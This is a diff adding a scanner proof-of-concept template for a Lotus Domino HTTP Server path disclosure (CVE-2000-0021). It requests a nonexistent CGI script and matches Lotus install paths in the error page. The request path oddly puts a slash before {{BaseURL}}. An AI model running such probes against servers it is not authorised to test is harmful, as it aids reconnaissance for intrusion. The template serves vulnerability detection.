@@ -1,0 +1,33 @@
+[info]
+author = "AVE"
+description = "向 Lotus Domino HTTP Server 的 /cgi-bin 目录请求一个不存在的 CGI 脚本，服务器返回的 404 错误响应中会包含 Web 根目录或 CGI 目录的绝对路径（如 /opt/lotus/cgi-bin/），导致服务器文件系统路径信息泄露。"
+id = "POC-AVE-2000-0019"
+name = "Lotus Domino HTTP Server CGI 路径泄露 PoC"
+severity = "medium"
+tags = [
+    "cve-2000-0021",
+    "ave-2000-0019",
+]
+vuln_id = [
+    "CVE-2000-0021",
+    "AVE-2000-0019",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/nonexistent.cgi"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "/opt/lotus",
+    "/usr/lotus",
+    "/local/lotus",
+    "cgi-bin",
+]
